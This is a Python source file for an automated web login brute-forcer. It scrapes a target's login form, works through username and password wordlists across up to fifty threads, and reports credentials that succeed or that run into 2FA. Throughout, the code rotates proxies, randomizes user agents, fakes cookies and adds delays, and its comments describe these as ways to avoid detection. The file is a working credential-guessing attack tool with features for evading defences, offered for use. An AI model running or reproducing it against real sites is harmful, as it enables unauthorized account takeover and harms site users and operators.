from bs4 import BeautifulSoup
import warnings
warnings.filterwarnings(action='ignore',module='bs4')

import requests
requests.packages.urllib3.disable_warnings()

from colorama import Fore, Style
from urllib.parse import urlparse
from fake_useragent import UserAgent
import threading
import concurrent.futures
import os
import time
import random
import uuid
from tqdm import tqdm
from itertools import cycle

# Bruteforcing username and password input fields
def test_proxy(proxy, test_url="https://www.google.com", timeout=3):
    """Test if a proxy works with both HTTP and HTTPS - optimized for speed"""
    try:
        # Reduce timeout for faster testing
        if proxy.startswith('http'):
            proxies = {'http': proxy, 'https': proxy}
        else:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            
        # Use HEAD request instead of GET for faster response
        response = requests.head(
            test_url, 
            proxies=proxies, 
            timeout=timeout,
            # Don't verify SSL to speed up connection
            verify=False,
            # Don't follow redirects to save time
            allow_redirects=False
        )
        
        # Accept any 2xx, 3xx status code as success
        if 200 <= response.status_code < 400:
            return True
    except Exception:
        # If that fails, try with explicit HTTP for HTTPS
        try:
            if not proxy.startswith('http'):
                proxy = f'http://{proxy}'
            proxies = {'http': proxy, 'https': proxy}
            
            # Use HEAD request for speed
            response = requests.head(
                test_url, 
                proxies=proxies, 
                timeout=timeout,
                verify=False,
                allow_redirects=False
            )
            
            if 200 <= response.status_code < 400:
                return True
        except Exception:
            pass
    return False

def load_proxies(proxy_file=None, test=True, max_workers=50):
    """Load proxies from a file and optionally test them in parallel"""
    if not proxy_file or not os.path.exists(proxy_file):
        return []
    with open(proxy_file, 'r') as f:
        proxies = [x.strip() for x in f.readlines() if x.strip()]
    
    print(f"{Fore.WHITE}[*] Loaded {Fore.MAGENTA}{len(proxies)} proxies from file{Style.RESET_ALL}")
    
    if test:
        print(f"{Fore.WHITE}[*] Testing proxies with {max_workers} concurrent workers...{Style.RESET_ALL}")
        working_proxies = []
        completed = 0
        print_lock = threading.Lock()
        
        # Try to import tqdm for progress bar
        try:
            progress_bar = tqdm(total=len(proxies), desc="Testing proxies", 
                               unit="proxy", ncols=80, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}')
            has_tqdm = True
        except ImportError:
            progress_bar = None
            has_tqdm = False
        
        def test_proxy_task(proxy):
            nonlocal completed
            result = test_proxy(proxy)
            
            with print_lock:
                completed += 1
                if has_tqdm:
                    progress_bar.update(1)
                else:
                    if completed % 10 == 0 or completed == len(proxies):
                        print(f"{Fore.WHITE}[*] Tested {completed}/{len(proxies)} proxies ({(completed/len(proxies))*100:.1f}%){Style.RESET_ALL}", end='\r')
                
                if result:
                    working_proxies.append(proxy)
                    if not has_tqdm:
                        print(f"\n{Fore.GREEN}[+] Working proxy: {proxy}{Style.RESET_ALL}")
            
            return result
        
        # Use ThreadPoolExecutor for parallel testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(test_proxy_task, proxy): proxy for proxy in proxies}
            
            # Wait for all futures to complete
            concurrent.futures.wait(futures)
        
        if has_tqdm:
            progress_bar.close()
        
        print(f"\n{Fore.WHITE}[*] Found {Fore.MAGENTA}{len(working_proxies)}/{len(proxies)} working proxies{Style.RESET_ALL}")
        return working_proxies
    
    return proxies

def get_random_user_agent():
    """Generate a random user agent"""
    try:
        ua = UserAgent()
        return ua.random
    except:
        # Fallback user agents if fake_useragent fails
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
        ]
        return random.choice(user_agents)

def password_wordlist(file: str) -> list:
    with open(file, 'r') as f:
        passwords = [x.strip() for x in f.readlines()]
    return passwords

def username_wordlist(file: str) -> list:
    with open(file, 'r') as f:
        usernames = [x.strip() for x in f.readlines()]
    return usernames

def randomize_cookies(base_cookies=None):
    """Generate randomized cookies"""
    # Start with required cookies or empty dict
    cookies = base_cookies.copy() if base_cookies else {}
    
    # Add random tracking-like cookies
    random_cookies = {
        f"_ga_{random.randint(1000, 9999)}": f"{uuid.uuid4()}",
        f"visitor_id{random.randint(100, 999)}": f"{random.randint(10000, 999999)}",
        "session_depth": str(random.randint(1, 5)),
        "last_visit": str(int(time.time()) - random.randint(3600, 86400))
    }
    
    # Randomly select some of these cookies
    for k, v in random_cookies.items():
        if random.random() > 0.6:  # 40% chance to include each cookie
            cookies[k] = v
            
    return cookies


def detect_2fa(response_text, response_url):
    """
    Detect if the response indicates a 2FA challenge
    Returns True if 2FA is detected, False otherwise
    """
    # Convert to lowercase for case-insensitive matching
    text_lower = response_text.lower()
    url_lower = response_url.lower()
    
    # Common 2FA indicators in response text
    text_indicators = [
        'two-factor', 'two factor', '2fa', 'second factor', 
        'verification code', 'security code', 'authenticator app',
        'authentication code', 'one-time password', 'otp', 
        'sms code', 'text message code', 'enter code',
        'google authenticator', 'authy', 'duo', 'yubikey',
        'multi-factor', 'mfa', 'additional verification',
        'confirm your identity', 'additional security',
        'security key', 'authentication token', 'Two-factor authentication',
        'Authentication code'
    ]
    
    # Common 2FA indicators in URL
    url_indicators = [
        '2fa', 'two-factor', 'twofactor', 'mfa', 'otp', 
        'verification', 'verify', 'authenticator', 'security-code',
        'second-step', 'second_step', 'challenge', 'sms'
    ]
    
    # Check for 2FA indicators in response text
    for indicator in text_indicators:
        if indicator in text_lower:
            return True
    
    # Check for 2FA indicators in URL
    for indicator in url_indicators:
        if indicator in url_lower:
            return True
    
    # Check for input fields that might indicate 2FA
    soup = BeautifulSoup(response_text, 'html.parser')
    
    # Look for verification code input fields
    code_inputs = soup.find_all('input', {
        'type': ['text', 'number', 'tel'],
        'name': lambda x: x and any(term in x.lower() for term in [
            'code', 'token', 'otp', 'verification', 'auth', 'factor'
        ])
    })
    
    if code_inputs:
        return True
    
    # Look for 2FA-related form labels or text
    labels = soup.find_all(['label', 'div', 'p', 'h1', 'h2', 'h3', 'h4', 'span'])
    for label in labels:
        if label.text and any(term in label.text.lower() for term in text_indicators):
            return True
    
    return False

def try_login_task(username, password, url, form_data, initial_url, success_indicators, verbose, proxy=None, user_agent=None, username_field=None, password_field=None):
    """Helper function for threaded login attempts with proxy and user agent support"""
    try:
        # Set up headers with random user agent
        headers = {'User-Agent': user_agent or get_random_user_agent()}
        
        # Set up proxy if provided
        proxies = None
        if proxy:
            if proxy.startswith('http'):
                proxies = {'http': proxy, 'https': proxy}
            else:
                proxies = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
        
        # Add a small random delay to further avoid detection
        time.sleep(random.uniform(0.1, 0.5))

        # Add random cookies technique, Makes requests appear to come from real browsers with history
        cookies = randomize_cookies()
        session = requests.Session()
        session.cookies.update(cookies)
        
        # Make the request with proxy and custom headers
        response = session.post(
            url, 
            data=form_data, 
            headers=headers,
            proxies=proxies,
            allow_redirects=True,
            cookies=cookies,
            timeout=10  # Increased timeout for proxy connections
        )
        
        response_text_lower = response.text.lower()

        print_lock = threading.Lock()
        # Check for 2FA before proceeding
        if detect_2fa(response.text, response.url):
            # Use print_lock to avoid garbled output in multithreaded context
            with print_lock:
                print(f"\n{Fore.YELLOW}[!] 2FA/MFA detected after login attempt with username: {Fore.MAGENTA}{username}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Password may be correct, but 2FA is preventing access{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Bruteforcing halted as 2FA cannot be automatically bypassed{Style.RESET_ALL}")
                
                # If verbose, provide more details
                if verbose:
                    print(f"{Fore.WHITE}[*] Response URL: {Fore.GREEN}{response.url}{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}[*] Potential valid credentials: {Fore.MAGENTA}{username} : {password}{Style.RESET_ALL}")
                
                # Return a special value to indicate 2FA was detected
                return ("2FA_DETECTED", username, password, response.url)
        
        # Quick check for obvious failures
        if any(neg in response_text_lower for neg in success_indicators['negative']):
            return None
            
        success = False
        
        # Check 1: URL change
        if response.url != initial_url:
            if any(indicator in response.url.lower() for indicator in success_indicators['url_change']):
                success = True
        
        # Check 2: Content check
        if any(indicator in response_text_lower for indicator in success_indicators['content']):
            success = True
            
        # Check 3: Redirect check
        if response.history and response.url != url and 'login' not in response.url.lower():
            success = True
            
        if success:
            return (username, password, response.url)
    
    except requests.exceptions.ProxyError as e:
        if verbose:
            # If it's an HTTP/HTTPS mismatch, provide more specific information
            if "Your proxy appears to only use HTTP and not HTTPS" in str(e):
               pass
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"{Fore.YELLOW}[!] Request error with proxy {proxy}: {str(e)}{Style.RESET_ALL}")
    except Exception as e:
        if verbose:
            print(f"{Fore.YELLOW}[!] Error: {str(e)}{Style.RESET_ALL}")
    return None

def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose=False):
    try:
        # Validate input files first
        if not username_file or not password_file:
            print(f"{Fore.RED}[!] Both username and password wordlists are required{Style.RESET_ALL}")
            return
            
        if not os.path.exists(username_file):
            print(f"{Fore.RED}[!] Username wordlist not found: {username_file}{Style.RESET_ALL}")
            return
            
        if not os.path.exists(password_file):
            print(f"{Fore.RED}[!] Password wordlist not found: {password_file}{Style.RESET_ALL}")
            return

        # Parse the target URL
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        path = parsed_url.path
        
        print(f"{Fore.WHITE}[*] Testing login form at {Fore.GREEN}{url}{Style.RESET_ALL}")
        
        # Check if the target URL is accessible
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            if verbose:
                print(f"{Fore.WHITE}[*] Successfully connected to target URL{Style.RESET_ALL}")
                print(f"{Fore.WHITE}[*] Response status code: {Fore.GREEN}{response.status_code}{Style.RESET_ALL}")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Could not access {url}: {str(e)}{Style.RESET_ALL}")
            return
        
        # Check if the target URL has a login form
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if not form:
            print(f"{Fore.YELLOW}[!] No login form found on {url}{Style.RESET_ALL}")
            return
        
        if verbose:
            print(f"{Fore.WHITE}[*] Found login form with action: {Fore.MAGENTA}{form.get('action', 'default')}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}[*] Form method: {Fore.MAGENTA}{form.get('method', 'POST')}{Style.RESET_ALL}")
        
        # Find all input fields in the login form
        input_fields = form.find_all('input')
        if not input_fields:
            print(f"{Fore.YELLOW}[!] No input fields found in form on {url}{Style.RESET_ALL}")
            return
        
        # Create a dictionary of input field names and values
        input_data = {}
        for field in input_fields:
            name = field.get('name')
            if name:
                input_data[name] = field.get('value', '')
                if verbose:
                    print(f"{Fore.WHITE}[*] Found form field: {Fore.MAGENTA}{name} (type: {field.get('type', 'text')}){Style.RESET_ALL}")

        # Create a dictionary of username and password input fields
        username_field = None
        password_field = None
        
        for name, value in input_data.items():
            if name.lower() in [
                'username', 'email', 'user', 'login', 'userid', 'user_id', 'user_name', 
                'loginid', 'login_id', 'account', 'accountname', 'account_name', 'identity',
                'uid', 'uname', 'nickname', 'handle', 'screen_name', 'member', 'memberid',
                'member_id', 'customer', 'customerid', 'customer_id', 'auth', 'authentication',
                'identifier', 'signin', 'sign_in', 'j_username', 'usr', 'usrname', 'username',
                'user', 'userid', 'user_id', 'user_name', 'loginid', 'login_id', 'account',
                'accountname', 'account_name', 'identity', 'uid', 'uname', 'nickname', 'handle',
                'screen_name', 'member', 'memberid', 'member_id', 'customer', 'customerid',
                'customer_id', 'auth', 'authentication', 'identifier', 'signin', 'sign_in',
                'j_username', 'usr', 'usrname', 'username', 'user', 'userid', 'user_id',
                'user_name', 'loginid', 'login_id', 'account', 'accountname', 'account_name', 'name']:
                username_field = name
            elif name.lower() in [
                'password', 'pass', 'pwd', 'passwd', 'passphrase', 'passkey',
                'password', 'pass', 'pwd', 'passwd', 'passphrase', 'secret', 'secretkey',
                'secret_key', 'credentials', 'cred', 'userpass', 'user_pass', 'passcode',
                'pass_code', 'pin', 'pincode', 'pin_code', 'p_word', 'pword', 'p_phrase',
                'pphrase', 'authkey', 'auth_key', 'security_key', 'securitykey', 'j_password',
                'pswd', 'pswrd', 'pw']:
                password_field = name

        if not username_field or not password_field:
            print(f"{Fore.YELLOW}[!] Could not identify username/password fields on {url}{Style.RESET_ALL}")
            return
            
        print(f"{Fore.WHITE}[*] Found login form fields - Username: {Fore.MAGENTA}{username_field}, {Fore.WHITE}Password: {Fore.MAGENTA}{password_field}{Style.RESET_ALL}")
        
        # Load wordlists
        try:
            usernames = password_wordlist(username_file)
            passwords = password_wordlist(password_file)
            
            print(f"{Fore.WHITE}[*] Loaded {Fore.MAGENTA}{len(usernames)} usernames and {Fore.MAGENTA}{len(passwords)} passwords{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading wordlists: {str(e)}{Style.RESET_ALL}")
            return

        # Load and test proxies ONCE at the beginning
        proxies = load_proxies(proxy_file, test=True, max_workers=50) if proxy_file else []
        proxy_cycle = cycle(proxies) if proxies else None
        
        if proxies:
            print(f"{Fore.WHITE}[*] Using {Fore.MAGENTA}{len(proxies)} working proxies{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] No working proxies found or proxy file not provided. Running without proxies.{Style.RESET_ALL}")

        success_indicators = {
            'url_change': [
                'my-account', 'dashboard', 'home', 'welcome', 'profile', 'account',
                'admin', 'panel', 'control', 'console', 'manage',
                'user', 'member', 'portal', 'secure', 'private',
                'overview', 'summary', 'main', 'index.php', 'default.aspx',
                'authenticated', 'session', 'loggedin', 'authorized'
            ],
            'content': [
                'log out', 'sign out', 'logout', 'signout', 'sign off', 'logoff',
                'welcome back', 'welcome,', 'hello,', 'hi,', 'greetings',
                'my account', 'your account', 'your profile', 'account settings',
                'dashboard', 'control panel', 'admin panel', 'user panel',
                'session', 'you are logged in', 'authenticated', 'authorized',
                'edit profile', 'change password', 'update details', 'account info',
                'menu', 'navigation', 'sidebar', 'settings', 'preferences',
                'two-factor', '2fa', 'security settings', 'activity log'
            ],
            'negative': [
                'invalid', 'incorrect', 'failed', 'error', 'try again', 'wrong',
                'authentication failed', 'login failed', 'access denied', 'denied',
                'invalid username', 'invalid password', 'invalid credentials',
                'incorrect username', 'incorrect password', 'wrong username', 'wrong password',
                'captcha', 'recaptcha', 'verification', 'locked', 'suspended',
                'too many attempts', 'rate limited', 'try later', 'timeout',
                'does not exist', 'not recognized', 'not found', 'please try',
                'sign in', 'log in', 'login form', 'remember me', 'forgot password'
            ]
        }
        
        # Get initial state
        initial_url = response.url
        if verbose:
            print(f"{Fore.WHITE}[*] Initial URL: {Fore.GREEN}{initial_url}{Style.RESET_ALL}")
        
        # Set up progress tracking
        total_combinations = len(usernames) * len(passwords)
        print(f"{Fore.WHITE}[*] Starting bruteforce with {Fore.MAGENTA}{total_combinations} combinations{Style.RESET_ALL}")
        
        # Use ThreadPoolExecutor for faster performance
        max_workers = min(50, os.cpu_count() * 5)  # Adjust based on your system
        print(f"{Fore.WHITE}[*] Using {Fore.MAGENTA}{max_workers} concurrent workers{Style.RESET_ALL}")
        
        # Create a counter for progress tracking
        completed = 0
        found_credentials = False
        print_lock = threading.Lock()
        
        # Try to import tqdm for progress bar
        try:
            progress_bar = tqdm(total=total_combinations, desc="Testing combinations", 
                               unit="combo", ncols=80, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}')
            has_tqdm = True
        except ImportError:
            progress_bar = None
            has_tqdm = False
            print(f"{Fore.WHITE}[*] tqdm not installed, using simple progress updates{Style.RESET_ALL}")
        
        # Function to update progress
        def update_progress():
            nonlocal completed
            completed += 1
            if has_tqdm:
                progress_bar.update(1)
            elif completed % 10 == 0:
                print(f"{Fore.WHITE}[*] Progress: {Fore.MAGENTA}{completed}/{total_combinations} ({(completed/total_combinations)*100:.1f}%){Style.RESET_ALL}", end='\r')
        
        # Function to process a single login attempt
        def process_login(username, password):
            nonlocal found_credentials, proxy_cycle
            
            # Skip if we already found credentials
            if found_credentials:
                return None
                
            # Create form data for this attempt
            form_data = input_data.copy()
            form_data[username_field] = username.strip()
            form_data[password_field] = password.strip()
            
            # Get a random user agent
            user_agent = get_random_user_agent()
            
            # Get a proxy if available - use the existing proxy_cycle
            proxy = next(proxy_cycle) if proxy_cycle else None
            
            # Try login with proxy and user agent
            result = try_login_task(username, password, url, form_data, initial_url, 
                                   success_indicators, verbose, proxy, user_agent,
                                   username_field, password_field)  # Pass the field names
            
            # Update progress
            with print_lock:
                update_progress()
                
            # Check if we found valid credentials or detected 2FA
            if result:
                if isinstance(result, tuple) and len(result) >= 3:
                    if result[0] == "2FA_DETECTED":
                        # 2FA was detected, handle specially
                        _, username, password, final_url = result
                        with print_lock:
                            if has_tqdm:
                                progress_bar.close()
                            print(f"\n{Fore.YELLOW}[!] 2FA detected with credentials - Username: {Fore.MAGENTA}{username} {Fore.WHITE}Password: {Fore.MAGENTA}{password}{Style.RESET_ALL}")
                            print(f"{Fore.WHITE}[+] Final URL: {Fore.GREEN}{final_url}{Style.RESET_ALL}")
                            print(f"{Fore.YELLOW}[!] Bruteforcing stopped as 2FA cannot be automatically bypassed{Style.RESET_ALL}")
                    else:
                        # Normal successful login
                        username, password, final_url = result
                        with print_lock:
                            if has_tqdm:
                                progress_bar.close()
                            print(f"\n{Fore.GREEN}[+] Success! {Fore.WHITE}Username: {Fore.MAGENTA}{username} {Fore.WHITE}Password: {Fore.MAGENTA}{password}{Style.RESET_ALL}")
                            print(f"{Fore.WHITE}[+] Final URL: {Fore.GREEN}{final_url}{Style.RESET_ALL}")
                
                found_credentials = True
                return result
                
            return None
        
        # Create all work items
        work_items = []
        for username in usernames:
            for password in passwords:
                work_items.append((username, password))
        
        # Process in batches
        batch_size = 1000
        for i in range(0, len(work_items), batch_size):
            if found_credentials:
                break
                
            batch = work_items[i:i+batch_size]
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(process_login, username, password): (username, password) for username, password in batch}
                
                for future in concurrent.futures.as_completed(futures):
                    if found_credentials:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                        
                    try:
                        result = future.result()
                        if result:
                            # We found valid credentials or detected 2FA
                            executor.shutdown(wait=False, cancel_futures=True)
                            break
                    except Exception as e:
                        if verbose:
                            with print_lock:
                                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        
        # Close progress bar if it exists
        if has_tqdm and progress_bar and not found_credentials:
            progress_bar.close()
        
        if not found_credentials:
            print(f"\n{Fore.YELLOW}[!] No valid credentials found after {completed} attempts{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}[!] Error during bruteforce attempt: {str(e)}{Style.RESET_ALL}")
        if verbose:
            import traceback
            traceback.print_exc()
